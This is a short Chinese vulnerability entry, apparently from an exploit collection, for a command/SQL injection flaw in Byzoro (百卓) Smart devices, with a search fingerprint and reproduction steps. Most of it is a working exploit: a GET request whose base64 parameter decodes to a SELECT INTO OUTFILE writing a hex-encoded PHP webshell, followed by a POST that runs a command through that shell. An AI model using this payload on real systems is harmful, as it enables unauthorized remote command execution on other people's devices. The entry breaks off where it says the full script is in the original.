# 百卓SmartSQL命令注入漏洞

- **系统**：百卓SmartSQL命令　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="byzoro-Smart"`
- **请求**：`GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvcy5waHAn HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`

**请求体 / payload**
```

写入文件位置
POST /app/s.php HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
cmd=ifconfig

其中`c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvcy5waHAn`为以下代码的base64编码
select 0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e into outfile '/usr/hddocs/nsg/app/s.php'
`0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e`为webshell hex编码\
hex解密网站`[https://www.bejson.com/convert/ox2str/](https://www.bejson.com/conv…（脚本共 614 字，完整版见原文）
```

**其他**
- 百卓Smart SQL命令注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 百卓Smart